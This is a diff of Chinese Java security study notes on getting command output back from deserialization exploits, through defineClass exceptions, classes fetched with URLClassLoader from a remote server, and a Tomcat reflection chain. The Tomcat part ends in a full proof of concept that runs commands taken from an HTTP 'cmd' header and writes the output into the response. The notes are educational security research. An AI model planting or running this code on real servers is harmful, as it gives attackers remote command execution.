@@ -6,13 +6,19 @@
 >
 > **《Java安全漫谈》**:https://github.com/phith0n/JavaThings
 >
+> https://www.cnblogs.com/nice0e3/default.html?page=1  
+>
+> https://sumsec.me/
+>
 > https://www.freebuf.com/column/3143 代码审计的学习笔记
+>
+> https://github.com/Firebasky/Java java安全笔记
 >
 > java代码审计的checklist：https://xz.aliyun.com/t/3358
 >
-> 《Java代码审计（入门篇）》
->
 > java漏洞复现：https://github.com/threedr3am/learnjavabug
+>
+> 其他
 >
 > jdk8历史版本 https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html
 
@@ -3004,7 +3010,7 @@ commons-beanutils依赖于commons-collections
                   this.name = name;
               }
           }
-          ```
+        ```
 
 - 它包含一个私有属性name，和读取和设置这个属性的两个方法，又称为getter和setter。其中，getter 的方法名以get开头，setter的方法名以set开头，全名符合骆驼式命名法（Camel-Case）。
 
@@ -3318,7 +3324,7 @@ serialVersionUID是什么？
                 return n1 - n2;
             }
     
-    ```
+   ```
 
 - 这个 CaseInsensitiveComparator 类是 java.lang.String 类下的一个内部私有类，其实现了 Comparator 和 Serializable ，且位于Java的核心代码中，兼容性强，是一个完美替代品。 
 
@@ -3343,6 +3349,8 @@ serialVersionUID是什么？
 
 ### 反序列化漏洞回显与内存马：
 
+> https://www.cnblogs.com/nice0e3/p/14945707.html#defineclass%E5%BC%82%E5%B8%B8%E5%9B%9E%E6%98%BE
+
 - 一般我们要想命令执行回显有以下几种方式
     - **defineClass**
     - **RMI绑定实例**
@@ -3353,19 +3361,162 @@ serialVersionUID是什么？
 
 #### **defineClass异常回显**
 
-- 先说defineClass这个东西是因为下面的几种方式都是在其基础上进行改进。defineClass归属于ClassLoader类，其主要作用就是使用编译好的字节码就可以定义一个类。
-- 我们定义的
-- 
+- 上面讲过defineClass是用来动态加载字节码的
 
-#### RMI绑定实例
+- 我们通过将命令执行的结果抛出异常来回显，这需要服务器将异常输出到页面上。
 
-- 使用commons-collection反射调用defineClass，通过defineClass定义的恶意命令执行字节码来绑定RMI实例，接着通过RMI调用绑定的实例拿到回显结果
+- 先定义一个抛出异常的恶意类
+
+    - ```java
+        package cc;
+        
+        import java.io.BufferedReader;
+        import java.io.InputStream;
+        import java.io.InputStreamReader;
+        import java.nio.charset.Charset;
+        
+        public class DefineClassExceptionShow {
+            public DefineClassExceptionShow(String cmd) throws Exception {
+                InputStream stream = (new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd})).start().getInputStream();
+                InputStreamReader streamReader = new InputStreamReader(stream, Charset.forName("gbk"));
+                BufferedReader bufferedReader = new BufferedReader(streamReader);
+                StringBuffer buffer = new StringBuffer();
+                String line = null;
+                while ((line = bufferedReader.readLine()) != null) {
+                    buffer.append(line).append("\n");
+                }
+                throw new Exception(buffer.toString());
+        
+            }
+            }
+        }
+        
+        ```
+
+- 回显代码
+
+    - ```java
+        package cc;
+        
+        import javassist.CannotCompileException;
+        import javassist.ClassPool;
+        import javassist.CtClass;
+        import javassist.NotFoundException;
+        
+        import java.io.IOException;
+        
+        public class DefineClassExceptionShowClassLoader extends ClassLoader {
+        
+            private static byte[] ClassBytes;
+            @Override
+            protected Class<?> findClass(String name) throws ClassNotFoundException {
+        
+                    ClassPool pool = ClassPool.getDefault();
+                    CtClass clazz = null;
+                    try {
+                        clazz = pool.get(DefineClassExceptionShow.class.getName());
+                    } catch (NotFoundException e) {
+                        throw new RuntimeException(e);
+                    }
+                    try {
+                        ClassBytes = clazz.toBytecode();
+                    } catch (IOException e) {
+                        throw new RuntimeException(e);
+                    } catch (CannotCompileException e) {
+                        throw new RuntimeException(e);
+                    }
+                    return defineClass(null, ClassBytes, 0, ClassBytes.length);
+                }
+        
+        
+            public static void main(String[] args) {
+                DefineClassExceptionShowClassLoader loader = new DefineClassExceptionShowClassLoader();
+                try {
+        
+                    Class testClass = loader.loadClass("");
+                    testClass.getConstructor(String.class).newInstance("ipconfig");
+        
+                    
+        
+                } catch (Exception e) {
+                    e.printStackTrace();
+        
+                }
+            }
+        }
+        ```
+
 
 #### URLClassLoader抛出异常
 
-- 通过将回显结果封装到异常信息抛出拿到回显。
+- 和defineClass异常回显一样，恶意类会把命令执行结果抛出异常。一旦字节码类初始化就会显示异常。
+
+- 异常类
+
+    - ```java
+        
+        import java.io.BufferedReader;
+        import java.io.InputStream;
+        import java.io.InputStreamReader;
+        import java.nio.charset.Charset;
+        
+        public class DefineClassExceptionShow {
+            public DefineClassExceptionShow(String cmd) throws Exception {
+                InputStream stream = (new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd})).start().getInputStream();
+                InputStreamReader streamReader = new InputStreamReader(stream, Charset.forName("gbk"));
+                BufferedReader bufferedReader = new BufferedReader(streamReader);
+                StringBuffer buffer = new StringBuffer();
+                String line = null;
+                while ((line = bufferedReader.readLine()) != null) {
+                    buffer.append(line).append("\n");
+                }
+                throw new Exception(buffer.toString());
+        
+            }
+            }
+        ```
+
+- 将上面的异常类Javac编译好，放到vps上面。
+
+- 恶意类
+
+    -  ```java
+         import java.lang.reflect.Constructor;
+         import java.lang.reflect.InvocationTargetException;
+         import java.net.MalformedURLException;
+         import java.net.URL;
+         import java.net.URLClassLoader;
+         
+         public class URLClassLoaderExceptionShow {
+             public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException {
+                 URL[] urls = {new URL("http://localhost:8000/")};
+                 URLClassLoader loader = URLClassLoader.newInstance(urls);
+                 Constructor<?> c = loader.loadClass("DefineClassExceptionShow").getConstructor(String.class);
+         
+                 c.newInstance("ipconfig");
+         
+             }
+         }
+         ```
+
+
+#### RMI绑定实例
+
+- 要调用的远程方法的接口，需要客户端，服务器端都要有这个代码。
+    - 需要寻找一个实现`Remote`的接口，也就是寻找RMI的实现接口。方法的返回类型应该为String，并且方法必须抛出`java.rmi.RemoteException` 异常。
+- 服务器实现这个接口,并且提供rmi服务
+- weblogic下的rmi绑定实例
+- 待补充
 
 #### 中间件回显
+
+> https://www.cnblogs.com/nice0e3/p/14891711.html
+>
+
+- 只要能拿到`request，Response`对象即可进行回显的构造，当然这也是众多方式的一种。也是目前用的较多的方式。
+
+- 但是很多框架对于Serlvet进行了封装，不同框架实现不同，同一框架的不同版本实现也可能不同，因此我们无法利用一种简单通用的方法去获取当前请求的response。
+- `request，response`的关键点是**寻找当前运行代码的上下文环境与Tomcat运行上下文环境之间的联系**。
 
 中间件而言多数重写了thread类，在thread中保存了req和resp，可以通过获取当前线程，在resp中写入回显结果
 
@@ -3380,7 +3531,522 @@ serialVersionUID是什么？
 
 不再赘述了，具体实现文章都有了。值得一提的思路可能就是反序列化不仅仅可以回显，也可以配合反射和字节码动态注册servlet实现无内存webshell。
 
-在weblogic中也有resp回显，具体代码在 [《weblogic_2019_2725poc与回显构造》](https://xz.aliyun.com/t/5299) lufei师傅已经给出来了
+##### Tomcat通用回显
+
+> 不同tomcat版本还有差别,不过有通杀poc
+>
+> https://www.anquanke.com/post/id/256966
+
+###### 寻找Request/Response：
+
+- 我们先看看Tomcat中哪个类会存储Request以及Response。
+- 起一个SpringBoot调试一下看看，在调用链中发现继承Http11Processor的AbstractProcessor中有Request以及Response的Field，而且这两个Field都是final类型的，也就是说其在赋值之后，对于对象的引用是不会改变的，**那么我们只要能够获取到这个Http11Processor就肯定可以拿到Request和Response**。
+
+-  idea使用技巧里面有调试tomcat的方法。
+- 我们下载好springboot内嵌的tomcat的源代码之后，全局搜索Request对象
+    - ![image-20221102115250851](./java代码审计.assets/image-20221102115250851.png)
+
+
+- 再看看Tomcat中哪个类会存储Request以及Response。
+
+- 发现AbstractProcessor抽象类中有Request以及Response的Field，而且这两个Field都是final类型的，也就是说其在赋值之后，对于对象的引用是不会改变的
+
+- 然后再找找谁实现了这个抽象类
+
+    - 发现`Http11Processor`实现了这个抽象类
+    - 这时候已经有了request，response，接下来往前寻找有没有哪里存储了这个Processor？或者是哪里对于Processor的Request等信息进行了存储？
+
+- 查找用法，发现AbstractHttp11Protocol存储了Http11Processor
+
+    - ```java
+            protected Processor createProcessor() {
+                Http11Processor processor = new Http11Processor(this, adapter);
+                return processor;
+            }
+        ```
+
+- 继续查找用法，`AbstractProtocol$ConnectionHandler#process`
+
+    - ```java
+        processor = getProtocol().createProcessor();
+        register(processor);
+        ```
+
+- 发现这个processor被注册了。
+
+    - `AbstractProtocal#register`
+
+    - ```java
+        protected void register(Processor processor) {
+            if (getProtocol().getDomain() != null) {
+                synchronized (this) {
+                    try {
+                        long count = registerCount.incrementAndGet();
+                        RequestInfo rp =
+                            processor.getRequest().getRequestProcessor();
+                        rp.setGlobalProcessor(global);
+                        ObjectName rpName = new ObjectName(
+                            getProtocol().getDomain() +
+                            ":type=RequestProcessor,worker="
+                            + getProtocol().getName() +
+                            ",name=" + getProtocol().getProtocolName() +
+                            "Request" + count);
+                        if (getLog().isDebugEnabled()) {
+                            getLog().debug("Register [" + processor + "] as [" + rpName + "]");
+                        }
+                        Registry.getRegistry(null, null).registerComponent(rp,
+                                                                           rpName, null);
+                        rp.setRpName(rpName);
+                    } catch (Exception e) {
+                        getLog().warn(sm.getString("abstractProtocol.processorRegisterError"), e);
+                    }
+                }
+            }
+        }
+        ```
+
+        ```java
+        rp.setGlobalProcessor(global);
+        ```
+
+    - 查看global变量
+
+        - ```java
+            private final RequestGroupInfo global = new RequestGroupInfo();
+            ```
+
+        - 其中这个RequestGroupInfo类型的核心就是一个存储所有RequestInfo的List。
+
+            - ```java
+                public class RequestGroupInfo extends BaseModelMBean {
+                    private final List<RequestInfo> processors = new ArrayList<>();
+                    private long deadMaxTime = 0;
+                ```
+
+    - 总结：调用链中的AbstractProtocol的内部类ConnectionHandler中在处理的时候就将当前的Processor的信息存储在了global中。
+
+- 下个断点调试一下
+
+    - ![image-20221102201631636](./java代码审计.assets/image-20221102201631636.png)
+
+    - 随便访问一个controller接口
+    - ![image-20221102201735963](./java代码审计.assets/image-20221102201735963.png)
+
+- 出来调用链了，那我们知道了response和requst是怎么初始化的。
+
+所以整体的思路下来我们需要获取`AbstractProtocol$ConnectionHandler` -> 获取global变量 ->RequestInfo->Request-->Response。
+
+###### 寻找`AbstractProtocol$ConnectionHandler`
+
+- NioEndpoint对象继承抽象类`AbstractJsseEndpoint`继承抽象类`AbstractEndpoint`
+
+    - 而抽象类`AbstractEndpoint`有个接口`Handler`，这个`Handler`的实现类是`AbstractProtocol$ConnectionsHandler`
+
+    - ```java
+        public static interface Handler<S> {
+        
+                /**
+                 * Different types of socket states to react upon.
+                 */
+                public enum SocketState {
+                    // TODO Add a new state to the AsyncStateMachine and remove
+                    //      ASYNC_END (if possible)
+                    OPEN, CLOSED, LONG, ASYNC_END, SENDFILE, UPGRADING, UPGRADED, ASYNC_IO, SUSPENDED
+        }
+        
+            
+        public Handler<S> getHandler() { return handler; }
+        
+        //这里设置handler
+        public void setHandler(Handler<S> handler ) { this.handler = handler; }
+        ```
+
+    - 我们看看查看哪里`setHandler`把`AbstractProtocol$ConnectionsHandler`传入了，同样在这里下个断点
+
+        - 发现是抽象类`AbstractHttp11Protocol`，同时我们发现了的确是把AbstractProtocol$ConnectionsHandler传入了
+
+            - ![image-20221102205319574](./java代码审计.assets/image-20221102205319574.png)
+
+        - 而且使用了endpoint对象来初始化AbstractProtocol
+
+            - ```java
+                public abstract class AbstractHttp11Protocol<S> extends AbstractProtocol<S> {
+                
+                    protected static final StringManager sm =
+                            StringManager.getManager(AbstractHttp11Protocol.class);
+                
+                    private final CompressionConfig compressionConfig = new CompressionConfig();
+                
+                
+                    public AbstractHttp11Protocol(AbstractEndpoint<S,?> endpoint) {
+                        super(endpoint);
+                        setConnectionTimeout(Constants.DEFAULT_CONNECTION_TIMEOUT);
+                        ConnectionHandler<S> cHandler = new ConnectionHandler<>(this);
+                        setHandler(cHandler);
+                        getEndpoint().setHandler(cHandler);
+                    }
+                ```
+
+        - 看看这个getEndpoint()返回了什么对象。返回的是NioEndpoint对象
+
+            - ```java
+                protected AbstractEndpoint<S,?> getEndpoint() {
+                	return super.getEndpoint();
+                }
+                ```
+
+    - 所以`NioEndpoint`对象中有`AbstractProtocol$ConnectionHandler`对象。上面分析是对象的初始化，我们想要知道初始化完成之后，`NioEndpoint`对象存放在哪。
+
+- 那怎么找到`NioEndpoint`对象在哪呢？
+
+    - `NioEndpoint$Poller`是`NioEndpoint`的一个内部类。找到这个对象就可以找到`NioEndpoint`对象
+
+- 那怎么找到`NioEndpoint$Poller`对象在哪呢？
+
+    - `NioEndpoint$Poller`是实现了Runnable接口。他被当作一个线程对象使用了。
+    - 所以在Thread里面
+
+###### 寻找`NioEndpoint$Poller`
+
+看下整个流程
+
+- 下个断点
+
+- ![image-20221102194735430](./java代码审计.assets/image-20221102194735430.png)
+
+- 调试分析
+
+    - ![image-20221102194803450](./java代码审计.assets/image-20221102194803450.png)
+
+    - ![image-20221102195450496](./java代码审计.assets/image-20221102195450496.png)
+
+**Thread**
+
+- 每个Java应用程序都有一个执行Main()函数的默认主线程。**这个就是主线程**
+
+- 应用程序也可以创建线程在后台运行。Java主要是通过Java.Lang.Thread类以及Java.lang.Runnable接口来实现线程机制的。**这边所有的都是其余线程**。
+
+- 在Java的反射中，get方法是可以获取该字段对应的对象。
+
+    - ```java
+        // 获取当前线程组
+        ThreadGroup group = Thread.currentThread().getThreadGroup();
+        // 反射获取字段threads
+        java.lang.reflect.Field f = group.getClass().getDeclaredField("threads");
+        f.setAccessible(true);
+        // f.get(group) 获取 threads 线程中数组对象
+        Thread[] threads = (Thread[]) f.get(group);
+        ```
+
+    - Object obj = field.get(类实例对象); 
+
+        - 当是调用类变量，类实例对象可以为null。
+        - 否则传入对象，如果不传对象，该方法会抛出一个NullPointerException。如果传的对象没有该字段该方法会抛出一个IllegalArgumentException。
+        - 这里的Object要写成对应的变量类型
+        - 如果字段不是类和接口的实例就会报错。
+
+线程处理:
+
+- 下个断点，看看有哪些线程
+    - ![image-20221102214201020](./java代码审计.assets/image-20221102214201020.png)
+
+- 获取线程名字，跳过不需要的线程。
+
+    - ```java
+         for(int i = 0; i < threads.length; i++) {
+             	Thread t = threads[i];
+             	if (t == null) continue;
+             
+                String str = t.getName();
+                //http-nio-8090-BlockPoller continue  NoSuchField异常 文章里面有这个异常，但是我的springboot没有，所以我直接排除BlockPoller线程。
+                if (str.contains("exec") || !str.contains("http")||str.contains("Acceptor")||str.contains("BlockPoller") ) {
+                    continue;
+                }
+        ```
+
+- **如何确定那些线程是需要的呢？**
+
+    - http-nio-8080-Acceptor为请求接收器，其只接收请求，不会对请求做任务业务处理操作，所以默认为单个线程。
+
+    - http-nio-8080-ClientPoller-0和http-nio-8080-ClientPoller-1为两个是作为轮询器或者转发器使用的，简单来说就是对获取到的`SocketWrapper`添加到一个线程池中进行处理，这种类型的线程数与CPU的核数有关。
+
+    - http-nio-8080-exec-1到10是tomcat的一个线程池产生的默认的10线程，这10个线程是用来执行具体的servlet请求操作，线程的数目可以跟随请求说的变化而变化。
+
+    - 以上3种类型的线程有点类似Reactor模式。Tomcat通过Connector中的Acceptor绑定8080端口并接收请求，然后通过Poller,Worker转交给`Http11Processor`解析出请求。ps: 8080均是指定端口
+
+        - ![img](./java代码审计.assets/t0171ddd12b74b8d015.png)
+
+        - ![img](./java代码审计.assets/t01824a8e9e0963012b.jpg)
+
+- 结合上面两张图和lucifaer大佬在文章Tomcat通用回显学习中所提交Processor对象，确定所需要的线程是`http-nio-xxxx-Poller`。
+
+- 利用IDEA功能导出线程栈部分数据如下。不难分析这里出现了`Poller`对象，有`Poller`就会有`Processor`对象。
+
+    - ```
+        "http-nio-8090-ClientPoller@5462" daemon prio=5 tid=0x2d nid=NA runnable
+          java.lang.Thread.State: RUNNABLE
+              at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll0(WindowsSelectorImpl.java:-1)
+              at sun.nio.ch.WindowsSelectorImpl$SubSelector.poll(WindowsSelectorImpl.java:296)
+              at sun.nio.ch.WindowsSelectorImpl$SubSelector.access$400(WindowsSelectorImpl.java:278)
+              at sun.nio.ch.WindowsSelectorImpl.doSelect(WindowsSelectorImpl.java:159)
+              at sun.nio.ch.SelectorImpl.lockAndDoSelect(SelectorImpl.java:86)
+              - locked <0x1682> (a sun.nio.ch.WindowsSelectorImpl)
+              - locked <0x168a> (a java.util.Collections$UnmodifiableSet)
+              - locked <0x168b> (a sun.nio.ch.Util$2)
+              at sun.nio.ch.SelectorImpl.select(SelectorImpl.java:97)
+              at org.apache.tomcat.util.net.NioEndpoint$Poller.run(NioEndpoint.java:816)
+              at java.lang.Thread.run(Thread.java:745)
+        ```
+
+**获取Processor对象**
+
+- 进入线程`Poller`之后，反射获取其中`target`字段，该字段的类型是`Runnable`。
+
+    - ![image-20221102214925675](./java代码审计.assets/image-20221102214925675.png)
+
+    - ```java
+        //str = http-nio-8090-ClientPoller 进入下面 ps: i=14
+        // java.lang.Thread
+        f = t.getClass().getDeclaredField("target");
+        f.setAccessible(true);
+        // obj ->  NioEndpoint$Poller实例化对象
+        Object obj = f.get(t);
+        // NioEndpoint$Poller  implements Runnable
+        if (!(obj instanceof Runnable)) {
+        continue;
+        ```
+
+- `NioEndpoint$Poller`是实现了Runnable接口，同时他是一个匿名内部类。
+
+- **通过匿名内部类（NioEndpoint\$Poller）获取持有的外部类对象（NioEndpoint），参考补充小知识this$0。**
+
+    - `this$0`是指获取匿名内部类持有的外部类对象，大致意思如下，`ThirdInner`的外部`this$0`类对象是`Outer`。更多内容可以参考[获取Java匿名内部类持有的外部类对象](https://www.jianshu.com/p/9335c15c43cf)。
+
+    - ```java
+        public class Outer {//this$0
+        
+            public class FirstInner {//this$1
+        
+                public class SecondInner {//this$2
+        
+                    public class ThirdInner {
+                    }
+                }
+            }
+        }
+        ```
+
+- ```java
+    // this$0 是NioEndpoint对象
+    f = obj.getClass().getDeclaredField("this$0");
+    f.setAccessible(true);
+
+- 获取到NioEndpoint对象之后，向上获取`Handler`对象。 `NioEndpoint` extends `AbstractJsseEndpoint`<NioChannel, SocketChannel>。
+
+- 然而在AbstractJsseEndpoint中是没有Handler字段对象的， 但在其extends `AbstractEndpoint`中是存在AbstractEndpoint$Handler字段。
+
+    - ```java
+        // f.get(obj) --> org.apche.tomcat.util.net.NioEndpoint 对象
+        obj = f.get(obj);
+        // NioEndpoint extends AbstractJsseEndpoint<NioChannel, SocketChannel> --> extends AbstractEndpoint$Handler
+        //  AbstractEndpoint$Handler 是一个接口，在org.apche.coyote.AbstractProtocol$ConnectionsHandler实现
+        try {
+        f = obj.getClass().getDeclaredField("handler");
+        } catch (NoSuchFieldException e) {
+        f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
+        }
+        // obj -->  org.apche.coyote.AbstractProtocol$ConnectionsHandler
+        f.setAccessible(true);
+        obj = f.get(obj);
+        ```
+
+- 在`AbstractEndpoint$Handler`是一个接口，其实现类`AbstractProtocol$ConnectionsHandler`是所需要的Handler。ConnectionsHanddler中是包含`global`字段。
+
+    - ```java
+        // obj --> org.apche.coyote.AbstractProtocol$ConnectionsHandler
+        try {
+        f = obj.getClass().getSuperclass().getDeclaredField("global");
+        } catch (NoSuchFieldException e) {
+        // obj --> AbstractProtocol$ConnectionsHandler
+        f = obj.getClass().getDeclaredField("global");
+        }
+        ```
+
+- 获取到`RequestGroupInfo`对象，在`RequestGroupInfo`之中有包含`Processor`对象`list`。
+
+    - ```java
+        // obj --> org.apche.coyote.RequestGroupInfo
+        f.setAccessible(true);
+        obj = f.get(obj);
+        f = obj.getClass().getDeclaredField("processors");
+        f.setAccessible(true);
+        // processors --> List<RequestInfo>
+        java.util.List processors = (java.util.List) (f.get(obj));
+        ```
+
+- 获取到Processor对象之后，接着获取`Request`和`Response`
+
+    - ```java
+        for (int j = 0; j < processors.size(); ++j) {
+                        Object processor = processors.get(j);
+                        f = processor.getClass().getDeclaredField("req");
+                        f.setAccessible(true);
+                        // org.apche.coyote.Request
+                        Object req = f.get(processor);
+                        // org.apche.coyote.Response
+                        Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req, new Object[0]);
+                        // header cc: "cmd"
+                        str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"CC"});
+        ```
+
+- 在resq的http头里面插入一个cmd字段当作rce的命令传入，然后写入到response中
+
+    - ```java
+                            try {
+                                Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
+                                obj = cls.newInstance();
+                                cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, new Object[]{result, new Integer(0), new Integer(result.length)});
+                                resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
+                            } catch (NoSuchMethodException | ClassNotFoundException var5) {
+                                Class cls = Class.forName("java.nio.ByteBuffer");
+                                obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{result});
+                                resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
+                            } catch (InvocationTargetException e) {
+                                throw new RuntimeException(e);
+                            } catch (InstantiationException e) {
+                                throw new RuntimeException(e);
+                            }
+        ```
+
+###### 完整的poc
+
+```java
+@Controller
+public class HelloWorld {
+    @RequestMapping("/tomcat")
+    @ResponseBody
+    public String test() throws IllegalAccessException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException, IOException, ClassNotFoundException {
+        // 获取当前线程组对象
+        ThreadGroup group = Thread.currentThread().getThreadGroup();
+        // 反射获取字段threads,保存了所有的线程对象
+        java.lang.reflect.Field f = group.getClass().getDeclaredField("threads");
+        f.setAccessible(true);
+        // f.get(group) 获取 threads 线程中数组对象
+        Thread[] threads = (Thread[]) f.get(group);
+        boolean flag = false;
+
+        //这么多线程，我们只需要http-nio-xxxx-Poller
+        for (int i = 0; i < threads.length; i++) {
+            try {
+                //获得全部线程
+                Thread t = threads[i];
+                if (t == null) continue;
+                String str = t.getName();
+
+                //http-nio-xxxx-Poller
+                if (str.contains("exec") || !str.contains("http") || str.contains("Acceptor") || str.contains("BlockPoller")) {
+                    continue;
+                }
+                //t -> java.lang.Thread
+                f = t.getClass().getDeclaredField("target");
+                f.setAccessible(true);
+                // obj ->  NioEndpoint$Poller实例化对象
+                Object obj = f.get(t);
+
+                // NioEndpoint$Poller  implements Runnable
+                if (!(obj instanceof Runnable)) continue;
+                // this$0 是NioEndpoint对象
+                f = obj.getClass().getDeclaredField("this$0");
+                f.setAccessible(true);
+                //NioEndpoint对象
+                obj = f.get(obj);
+
+                // NioEndpoint extends AbstractJsseEndpoint<NioChannel, SocketChannel> --> extends AbstractEndpoint$Handler
+                //  AbstractEndpoint$Handler 是一个接口，在org.apche.coyote.AbstractProtocol$ConnectionsHandler实现
+                try {
+                    f = obj.getClass().getDeclaredField("handler");
+                } catch (NoSuchFieldException e) {
+                    f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
+                }
+                // obj -->  org.apche.coyote.AbstractProtocol$ConnectionsHandler
+                f.setAccessible(true);
+                // obj --> org.apche.coyote.AbstractProtocol$ConnectionsHandler
+                obj = f.get(obj);
+                try {
+                    f = obj.getClass().getSuperclass().getDeclaredField("global");
+                } catch (NoSuchFieldException e) {
+                    // obj --> AbstractProtocol$ConnectionsHandler
+                    f = obj.getClass().getDeclaredField("global");
+                }
+                f.setAccessible(true);
+                // obj --> org.apche.coyote.RequestGroupInfo
+                obj = f.get(obj);
+                f = obj.getClass().getDeclaredField("processors");
+                f.setAccessible(true);
+                // processors --> List<RequestInfo>
+                java.util.List processors = (java.util.List) (f.get(obj));
+
+
+                for (int j = 0; j < processors.size(); ++j) {
+                    Object processor = processors.get(j);
+
+                    f = processor.getClass().getDeclaredField("req");
+                    f.setAccessible(true);
+                    // org.apche.coyote.Request
+                    Object req = f.get(processor);
+                    // org.apche.coyote.Response
+                    Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req, new Object[0]);
+
+
+                    //在resq的http头里面插入一个cmd字段当作rce的命令传入，然后写入到response中
+                    str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});
+                    if (str != null && !str.isEmpty()) {
+                        resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
+                        String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/sh", "-c", str};
+                        byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next().getBytes();
+                        try {
+                            Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
+                            obj = cls.newInstance();
+                            cls.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(obj, new Object[]{result, new Integer(0), new Integer(result.length)});
+                            resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
+                        } catch (NoSuchMethodException var5) {
+                            Class cls = Class.forName("java.nio.ByteBuffer");
+                            obj = cls.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(cls, new Object[]{result});
+                            resp.getClass().getMethod("doWrite", new Class[]{cls}).invoke(resp, new Object[]{obj});
+                        }
+                        flag = true;
+                    }
+                    if (flag) break;
+                }
+                if (flag) break;
+            } catch (Exception e) {
+                continue;
+            }
+        }
+
+
+        return "tomcat";
+    }
+}
+
+```
+
+结果：
+
+- 同时response的原理不是覆盖写入，所以后面即使往页面写了东西，也不会覆盖掉命令执行的结果
+- ![image-20221102221520554](./java代码审计.assets/image-20221102221520554.png)
+
+
+
+
+
+##### Tomcat半通用回显
+
+##### weblogic回显
+
+具体代码在 [《weblogic_2019_2725poc与回显构造》](https://xz.aliyun.com/t/5299) lufei师傅已经给出来了
+
+##### 内存马
 
 #### 写文件和dnslog
 
@@ -3885,6 +4551,8 @@ serialVersionUID是什么？
 - 在1.2.4版本后，shiro已经更换 AES-CBC AES-CBC 为 AES-GCM AES-GCM ，无法再通过Padding Oracle遍历key。
 
 ##### 权限绕过漏洞（CVE-2020-1957）
+
+## 内存马
 
 ## RMI
 
@@ -6343,3 +7011,230 @@ SQL注入：
 OpenRASP是由百度开源的RASP。
 
 RASP（Runtime application self-protection）运行时应用自我保护。RSAP将自身注入到应用程序中，与应用程序融为一体，实时监测、阻断攻击，使程序自身拥有自保护的能力。并且应用程序无需在编码时进行任何的修改，只需进行简单的配置即可
+
+## idea使用技巧
+
+### 使用idea来调试tomcat
+
+> https://www.cnblogs.com/liliqiang/articles/8283715.html
+
+启动springboot找到Tomcat启动入口
+
+> https://blog.csdn.net/CSDN_WYL2016/article/details/127292136
+
+- 我们知道springboot内嵌了tomcat，所以一种简单的方式是我们可以在springboot启动的时候在controller下个断点，来调试tomcat启动。
+
+    - ![image-20221102112916715](./java代码审计.assets/image-20221102112916715.png)
+
+    
+
+- 跟到这，准备进入spring的环境中
+
+    - ServletWebServerApplicationContext（AbstractApplicationContext的一个子类）
+
+        - ```
+            	public final void refresh() throws BeansException, IllegalStateException {
+            		try {
+            			super.refresh();
+            		}
+            		catch (RuntimeException ex) {
+            			WebServer webServer = this.webServer;
+            			if (webServer != null) {
+            				webServer.stop();
+            			}
+            			throw ex;
+            		}
+            	}
+            ```
+
+- `refresh`方法为spring启动的核心流程方法
+
+    - ```
+        	public void refresh() throws BeansException, IllegalStateException {
+        		synchronized (this.startupShutdownMonitor) {
+        			StartupStep contextRefresh = this.applicationStartup.start("spring.context.refresh");
+        
+        			// Prepare this context for refreshing.
+        			prepareRefresh();
+        
+        			// Tell the subclass to refresh the internal bean factory.
+        			ConfigurableListableBeanFactory beanFactory = obtainFreshBeanFactory();
+        
+        			// Prepare the bean factory for use in this context.
+        			prepareBeanFactory(beanFactory);
+        
+        			try {
+        				// Allows post-processing of the bean factory in context subclasses.
+        				postProcessBeanFactory(beanFactory);
+        
+        				StartupStep beanPostProcess = this.applicationStartup.start("spring.context.beans.post-process");
+        				// Invoke factory processors registered as beans in the context.
+        				invokeBeanFactoryPostProcessors(beanFactory);
+        
+        				// Register bean processors that intercept bean creation.
+        				registerBeanPostProcessors(beanFactory);
+        				beanPostProcess.end();
+        
+        				// Initialize message source for this context.
+        				initMessageSource();
+        
+        				// Initialize event multicaster for this context.
+        				initApplicationEventMulticaster();
+        
+        				// Initialize other special beans in specific context subclasses.
+        				onRefresh();
+        
+        				// Check for listener beans and register them.
+        				registerListeners();
+        
+        				// Instantiate all remaining (non-lazy-init) singletons.
+        				finishBeanFactoryInitialization(beanFactory);
+        
+        				// Last step: publish corresponding event.
+        				finishRefresh();
+        			}
+         
+        ```
+
+- 通过spring预留的onRefresh扩展，回到ServletWebServerApplicationContext中
+
+    - ```
+        `	protected void onRefresh() {
+        		super.onRefresh();
+        		try {
+        			createWebServer();
+        		}
+        		catch (Throwable ex) {
+        			throw new ApplicationContextException("Unable to start web server", ex);
+        		}
+        	}
+        ```
+
+    - ```java
+        	private void createWebServer() {
+        		WebServer webServer = this.webServer;
+        		ServletContext servletContext = getServletContext();
+        		if (webServer == null && servletContext == null) {
+        			StartupStep createWebServer = this.getApplicationStartup().start("spring.boot.webserver.create");
+        			ServletWebServerFactory factory = getWebServerFactory();
+        			createWebServer.tag("factory", factory.getClass().toString());
+        			this.webServer = factory.getWebServer(getSelfInitializer());
+        			createWebServer.end();
+        			getBeanFactory().registerSingleton("webServerGracefulShutdown",
+        					new WebServerGracefulShutdownLifecycle(this.webServer));
+        			getBeanFactory().registerSingleton("webServerStartStop",
+        					new WebServerStartStopLifecycle(this, this.webServer));
+        		}
+        		else if (servletContext != null) {
+        			try {
+        				getSelfInitializer().onStartup(servletContext);
+        			}
